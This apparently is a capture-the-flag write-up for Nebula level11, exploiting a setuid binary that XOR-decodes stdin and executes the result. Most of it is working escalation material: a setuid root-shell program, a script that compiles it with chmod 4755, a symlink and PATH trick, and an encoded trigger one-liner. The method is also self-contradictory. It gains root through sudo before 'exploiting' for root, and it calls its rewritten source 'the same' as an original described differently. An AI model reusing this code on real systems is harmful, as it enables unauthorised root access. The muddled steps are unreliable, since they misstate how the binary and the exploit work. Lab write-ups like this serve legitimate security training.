
---
### üîé Challenge Description

> The binary at `/home/flag11/flag11` reads specially formatted input, processes it with XOR encoding, and then passes it to `system()`. However, the SetUID logic is broken, meaning **you must fix the binary to exploit it**.

**Login:** `level11 : level11`  
**Target Binary:** `/home/flag11/flag11`  
**Vulnerability:** Command injection through `stdin` and broken privilege preservation.

---

### üß∞ Phase 1: Fix the Broken Binary

The original binary drops privileges before calling `system()`. To fix this:

#### üîß Steps:

1. SSH into the Nebula VM:
    
    ```bash
    ssh level11@<target-ip>
    ```
    
2. Elevate to root:
    
    ```bash
    sudo -s
    # password: nebula
    ```
    
3. Create `fix.c` with the same source as the original binary and recompile:
    

```c
// fix.c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void process(char *buffer, int length) {
    int i;
    char *args[] = { "/bin/bash", 0 };
    char *env[] = { 0 };

    for(i = 0; i < length; i++) {
        buffer[i] ^= 0x0f;
    }

    execve(buffer, args, env);
}

int main(int argc, char **argv) {
    char buffer[1024];
    int length;

    printf("Content-Length: ");
    scanf("%d\n", &length);

    if(length > sizeof(buffer))
        return 1;

    fread(buffer, length, 1, stdin);
    process(buffer, length);
    return 0;
}
```

4. Recompile and restore SetUID:
    

```bash
gcc -o /home/flag11/flag11 fix.c
chmod u+s /home/flag11/flag11
```

---

### üß™ Phase 2: Understand the Input Format

The binary expects input like:

```bash
Content-Length: <len>\n<buffer>
```

It then XORs each byte of `<buffer>` with `0x0F`, and passes the result to `execve()`.

üß† So if you want to execute `/tmp/m`, XOR it first:

```bash
python3 -c 'print("".join([chr(ord(c)^0x0f) for c in "/tmp/m"]))'
```

---

### ‚öîÔ∏è Phase 3: The Exploit Plan

We‚Äôll abuse this flaw to execute a malicious script that gives us root access.

#### üß± Step 1: Create a SUID Shell Generator

```c
// /home/level11/shell.c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    setresuid(geteuid(), geteuid(), geteuid());
    setresgid(getegid(), getegid(), getegid());
    system("/bin/bash");
    return 0;
}
```

#### üîß Step 2: Write the Compiler Script

```bash
# /home/level11/compiler.sh
#!/bin/sh
gcc /home/level11/shell.c -o /home/level11/shell
chmod 4755 /home/level11/shell
```

#### üîó Step 3: Symbolic Link and PATH Setup

```bash
ln -s /home/level11/compiler.sh /tmp/m
export PATH=/tmp:$PATH
```

#### üöÄ Step 4: Trigger the Exploit

Now execute:

```bash
echo -ne "Content-Length: 6\n$(python3 -c 'print("".join([chr(ord(c)^0x0f) for c in "/tmp/m"]))')" | /home/flag11/flag11
```

The binary will decode the buffer into `/tmp/m`, execute it, and compile your **SUID root shell**.

---

### üèÅ Final Step: Root Shell Achieved

```bash
/home/level11/shell
```

‚úÖ Output:

```bash
# whoami
root
```

---

### üìö Lessons Learned

This level combines two powerful ideas:

- **Command injection via XOR-ed stdin**
    
- **Privilege restoration and custom SetUID shell compilation**
    

üß† **Security Insight:**

> Always validate decoded user input before execution, and avoid dynamically calling `execve()` or `system()` with untrusted sources ‚Äî especially in privileged binaries.

---
